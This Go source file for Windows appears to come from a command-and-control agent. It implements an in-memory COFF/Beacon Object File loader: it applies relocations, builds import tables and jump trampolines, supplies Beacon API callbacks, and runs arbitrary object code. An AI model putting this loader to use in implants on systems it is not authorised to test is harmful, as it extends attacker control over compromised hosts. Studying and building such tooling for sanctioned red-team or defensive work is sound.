//go:build windows
// +build windows

package commands

import (
	"fmt"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/RIscRIpt/pecoff"
	"github.com/RIscRIpt/pecoff/binutil"
	"github.com/RIscRIpt/pecoff/windef"
	"golang.org/x/sys/windows"
)

// Custom COFF loader with fixed Beacon API implementations
// Based on goffloader but with GC-safe BeaconDataExtract

const coffImageScnMemExecute = 0x20000000

type coffSection struct {
	Section *pecoff.Section
	Address uintptr
}

// LoadAndRunBOF loads a COFF/BOF file and executes it with the given arguments
func LoadAndRunBOF(coffBytes []byte, argBytes []byte, entryPoint string) (string, error) {
	outputChan := make(chan interface{}, 100)

	parsedCoff := pecoff.Explore(binutil.WrapByteSlice(coffBytes))
	parsedCoff.ReadAll()
	parsedCoff.Seal()

	sections := make(map[string]coffSection, parsedCoff.Sections.Len())

	gotBaseAddress := uintptr(0)
	gotOffset := 0
	gotSize := uint32(0)
	var gotMap = make(map[string]uintptr)

	trampolineBaseAddress := uintptr(0)
	trampolineOffset := 0
	trampolineSize := uint32(0)
	var trampolineMap = make(map[string]uintptr)

	bssBaseAddress := uintptr(0)
	bssOffset := 0
	bssSize := uint32(0)

	// Calculate sizes for special sections
	// GOT: 8 bytes per __imp_ symbol. Trampoline: 16 bytes per bare symbol
	// (JMP stub for direct CALL rel32 that can't reach windows.NewCallback addresses).
	// BSS: for bare symbols that don't resolve to any known function.
	for _, symbol := range parsedCoff.Symbols {
		if isSpecialSymbol(symbol) {
			if isImportSymbol(symbol) {
				gotSize += 8
			} else {
				trampolineSize += 16
				bssSize += symbol.Value + 8
			}
		}
	}

	// Allocate memory for each section
	for _, section := range parsedCoff.Sections.Array() {
		allocationSize := uintptr(section.SizeOfRawData)
		if strings.HasPrefix(section.NameString(), ".bss") {
			allocationSize = uintptr(bssSize)
		}

		if allocationSize == 0 {
			continue
		}

		// Allocate all sections as RW with MEM_TOP_DOWN to keep them close together.
		// This prevents REL32 relocation overflow when sections are >2GB apart.
		// Executable sections will be VirtualProtect'd to RX after relocations.
		var addr uintptr
		var err error
		addr, err = virtualAllocRW(uint32(allocationSize))
		if err != nil {
			return "", fmt.Errorf("memory allocation failed for section %s: %w", section.NameString(), err)
		}

		if strings.HasPrefix(section.NameString(), ".bss") {
			bssBaseAddress = addr
		}

		// Copy section data with bounds check
		rawData := section.RawData()
		if uintptr(len(rawData)) > allocationSize {
			return "", fmt.Errorf("section %s raw data (%d bytes) exceeds allocation (%d bytes)", section.NameString(), len(rawData), allocationSize)
		}
		if len(rawData) > 0 {
			copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:allocationSize], rawData)
		}

		sections[section.NameString()] = coffSection{
			Section: section,
			Address: addr,
		}
	}

	// Allocate GOT for __imp_ symbols
	if gotSize == 0 {
		gotSize = 8
	}
	gotBaseAddress, err := virtualAllocRW(gotSize)
	if err != nil {
		return "", fmt.Errorf("GOT memory allocation failed: %w", err)
	}

	// Allocate trampoline area for bare symbols (direct CALL rel32 targets).
	// Each trampoline is 14 bytes (FF 25 00 00 00 00 + 8-byte addr), padded to 16.
	if trampolineSize == 0 {
		trampolineSize = 16
	}
	trampolineBaseAddress, err = virtualAllocRW(trampolineSize)
	if err != nil {
		return "", fmt.Errorf("trampoline memory allocation failed: %w", err)
	}

	// Process relocations
	for _, section := range parsedCoff.Sections.Array() {
		sectionVirtualAddr := sections[section.NameString()].Address

		for _, reloc := range section.Relocations() {
			symbol := parsedCoff.Symbols[reloc.SymbolTableIndex]

			if symbol.StorageClass > 3 {
				continue
			}

			symbolDefAddress := uintptr(0)

			if isSpecialSymbol(symbol) {
				externalAddress := resolveExternalSymbol(symbol.NameString(), outputChan)

				if externalAddress != 0 && isImportSymbol(symbol) {
					// __imp_ symbols: store address in GOT (indirect call through pointer)
					if existingGotAddress, exists := gotMap[symbol.NameString()]; exists {
						symbolDefAddress = existingGotAddress
					} else {
						if uintptr(gotOffset*8+8) > uintptr(gotSize) {
							return "", fmt.Errorf("GOT overflow: offset %d exceeds allocated size %d", gotOffset*8+8, gotSize)
						}
						symbolDefAddress = gotBaseAddress + uintptr(gotOffset*8)
						gotOffset++
						gotMap[symbol.NameString()] = symbolDefAddress
					}
					*(*uint64)(unsafe.Pointer(symbolDefAddress)) = uint64(externalAddress)
				} else if externalAddress != 0 {
					// Bare symbol: create JMP trampoline near BOF code.
					// Direct CALL rel32 requires an executable target within ±2GB;
					// windows.NewCallback() addresses may be far away.
					if existingAddr, exists := trampolineMap[symbol.NameString()]; exists {
						symbolDefAddress = existingAddr
					} else {
						trampAddr := trampolineBaseAddress + uintptr(trampolineOffset)
						// FF 25 00 00 00 00 = jmp qword ptr [rip+0]
						*(*[6]byte)(unsafe.Pointer(trampAddr)) = [6]byte{0xFF, 0x25, 0x00, 0x00, 0x00, 0x00}
						*(*uint64)(unsafe.Pointer(trampAddr + 6)) = uint64(externalAddress)
						trampolineMap[symbol.NameString()] = trampAddr
						trampolineOffset += 16
						symbolDefAddress = trampAddr
					}
				} else if isImportSymbol(symbol) {
					return "", fmt.Errorf("failed to resolve external symbol: %s", symbol.NameString())
				} else {
					if uintptr(bssOffset)+uintptr(symbol.Value)+8 > uintptr(bssSize) {
						return "", fmt.Errorf("BSS overflow: offset %d + size %d exceeds allocated %d", bssOffset, symbol.Value+8, bssSize)
					}
					symbolDefAddress = bssBaseAddress + uintptr(bssOffset)
					bssOffset += int(symbol.Value) + 8
				}
			} else {
				if int(symbol.SectionNumber) < 1 || int(symbol.SectionNumber) > parsedCoff.Sections.Len() {
					return "", fmt.Errorf("symbol %s references invalid section %d", symbol.NameString(), symbol.SectionNumber)
				}
				targetSection := parsedCoff.Sections.Array()[symbol.SectionNumber-1]
				symbolDefAddress = sections[targetSection.NameString()].Address + uintptr(symbol.Value)
			}

			processReloc(symbolDefAddress, sectionVirtualAddr, reloc, symbol)
		}

	}

	// Mark trampoline area executable
	if trampolineOffset > 0 {
		if err := virtualProtectRX(trampolineBaseAddress, uint32(trampolineOffset)); err != nil {
			return "", fmt.Errorf("trampoline protection change failed: %w", err)
		}
		flushInstructionCache(trampolineBaseAddress, uint32(trampolineOffset))
	}

	// Mark executable sections as RX and flush instruction cache
	for _, section := range parsedCoff.Sections.Array() {
		if section.Characteristics&coffImageScnMemExecute != 0 {
			sec, ok := sections[section.NameString()]
			if !ok || sec.Address == 0 {
				continue
			}
			size := section.SizeOfRawData
			if size == 0 {
				continue
			}
			if err := virtualProtectRX(sec.Address, size); err != nil {
				return "", fmt.Errorf("protection change failed for section %s: %w", section.NameString(), err)
			}
			flushInstructionCache(sec.Address, size)
		}
	}

	// Find and call entry point
	go func() {
		defer close(outputChan)
		defer func() {
			if r := recover(); r != nil {
				outputChan <- fmt.Sprintf("BOF panic: %v", r)
			}
		}()

		for _, symbol := range parsedCoff.Symbols {
			if symbol.NameString() == entryPoint {
				mainSection := parsedCoff.Sections.Array()[symbol.SectionNumber-1]
				entryAddr := sections[mainSection.NameString()].Address + uintptr(symbol.Value)

				if len(argBytes) == 0 {
					argBytes = make([]byte, 1)
				}
				syscall.SyscallN(entryAddr, uintptr(unsafe.Pointer(&argBytes[0])), uintptr(len(argBytes)))
				return
			}
		}
		outputChan <- fmt.Sprintf("Entry point '%s' not found", entryPoint)
	}()

	// Collect output with timeout to prevent blocking the agent
	var outputBuf strings.Builder
	timedOut := false
	timeout := time.After(30 * time.Second)
collectLoop:
	for {
		select {
		case msg, ok := <-outputChan:
			if !ok {
				break collectLoop
			}
			fmt.Fprintf(&outputBuf, "%v\n", msg)
		case <-timeout:
			outputBuf.WriteString("[!] BOF execution timed out after 30 seconds\n")
			timedOut = true
			break collectLoop
		}
	}
	output := outputBuf.String()

	// Only free memory if the BOF goroutine has completed.
	// If it timed out, the goroutine may still be executing code in these
	// pages — freeing them would cause a use-after-free crash.
	if !timedOut {
		for _, sec := range sections {
			windows.VirtualFree(sec.Address, 0, windows.MEM_RELEASE)
		}
		if gotBaseAddress != 0 {
			windows.VirtualFree(gotBaseAddress, 0, windows.MEM_RELEASE)
		}
		if trampolineBaseAddress != 0 {
			windows.VirtualFree(trampolineBaseAddress, 0, windows.MEM_RELEASE)
		}
	}

	return output, nil
}

func isSpecialSymbol(sym *pecoff.Symbol) bool {
	return sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber == 0
}

func isImportSymbol(sym *pecoff.Symbol) bool {
	return strings.HasPrefix(sym.NameString(), "__imp_")
}

func resolveExternalSymbol(symbolName string, outChannel chan<- interface{}) uintptr {
	// Strip __imp_ prefix if present; also handle symbols without it
	// (BOFs compiled without __declspec(dllimport))
	cleanName := symbolName
	if strings.HasPrefix(cleanName, "__imp_") {
		cleanName = cleanName[6:]
	}
	if strings.HasPrefix(cleanName, "_") {
		cleanName = cleanName[1:]
	}

	// Check for Beacon API functions - use OUR implementations
	switch cleanName {
	case "BeaconOutput":
		return windows.NewCallback(getBeaconOutputCallback(outChannel))
	case "BeaconDataParse":
		return windows.NewCallback(BeaconDataParse)
	case "BeaconDataInt":
		return windows.NewCallback(BeaconDataInt)
	case "BeaconDataShort":
		return windows.NewCallback(BeaconDataShort)
	case "BeaconDataLength":
		return windows.NewCallback(BeaconDataLength)
	case "BeaconDataExtract":
		return windows.NewCallback(BeaconDataExtract) // Our fixed version!
	case "BeaconPrintf":
		return windows.NewCallback(getBeaconPrintfCallback(outChannel))
	}

	// Dynamic Function Resolution (Library$Function format)
	if strings.Contains(cleanName, "$") {
		parts := strings.Split(cleanName, "$")
		libName := parts[0] + ".dll"
		procName := parts[1]

		lib, err := syscall.LoadLibrary(libName)
		if err != nil {
			return 0
		}
		proc, err := syscall.GetProcAddress(lib, procName)
		if err != nil {
			return 0
		}
		return proc
	}

	// Standard library functions
	var libName string
	switch cleanName {
	case "FreeLibrary", "LoadLibraryA", "GetProcAddress", "GetModuleHandleA":
		libName = "kernel32.dll"
	case "MessageBoxA":
		libName = "user32.dll"
	default:
		return 0
	}

	lib, err := syscall.LoadLibrary(libName)
	if err != nil {
		return 0
	}
	proc, err := syscall.GetProcAddress(lib, cleanName)
	if err != nil {
		return 0
	}
	return proc
}

func getBeaconOutputCallback(ch chan<- interface{}) func(int, uintptr, int) uintptr {
	return func(outType int, data uintptr, length int) uintptr {
		if length <= 0 {
			return 0
		}
		out := make([]byte, length)
		for i := 0; i < length; i++ {
			out[i] = *(*byte)(unsafe.Pointer(data + uintptr(i)))
		}
		ch <- string(out)
		return 1
	}
}

func getBeaconPrintfCallback(ch chan<- interface{}) func(int, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr, uintptr) uintptr {
	return func(outType int, format uintptr, a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
		formatStr := readCString(format)
		// Basic format string handling
		ch <- formatStr
		return 0
	}
}

func processReloc(symbolDefAddress uintptr, sectionAddress uintptr, reloc windef.Relocation, symbol *pecoff.Symbol) {
	symbolOffset := uintptr(reloc.VirtualAddress)
	absoluteSymbolAddress := symbolOffset + sectionAddress
	segmentValue := *(*uint32)(unsafe.Pointer(absoluteSymbolAddress))

	if (symbol.StorageClass == windef.IMAGE_SYM_CLASS_STATIC && symbol.Value != 0) ||
		(symbol.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && symbol.SectionNumber != 0) {
		symbolOffset = uintptr(symbol.Value)
	} else {
		symbolDefAddress += uintptr(segmentValue)
	}

	switch reloc.Type {
	case windef.IMAGE_REL_AMD64_ADDR64:
		*(*uint64)(unsafe.Pointer(absoluteSymbolAddress)) = uint64(symbolDefAddress)
	case windef.IMAGE_REL_AMD64_ADDR32NB:
		valueToWrite := symbolDefAddress - (sectionAddress + 4 + symbolOffset)
		*(*uint32)(unsafe.Pointer(absoluteSymbolAddress)) = uint32(valueToWrite)
	case windef.IMAGE_REL_AMD64_REL32, windef.IMAGE_REL_AMD64_REL32_1, windef.IMAGE_REL_AMD64_REL32_2,
		windef.IMAGE_REL_AMD64_REL32_3, windef.IMAGE_REL_AMD64_REL32_4, windef.IMAGE_REL_AMD64_REL32_5:
		relativeAddr := symbolDefAddress - uintptr(reloc.Type-4) - (absoluteSymbolAddress + 4)
		*(*uint32)(unsafe.Pointer(absoluteSymbolAddress)) = uint32(relativeAddr)
	}
}
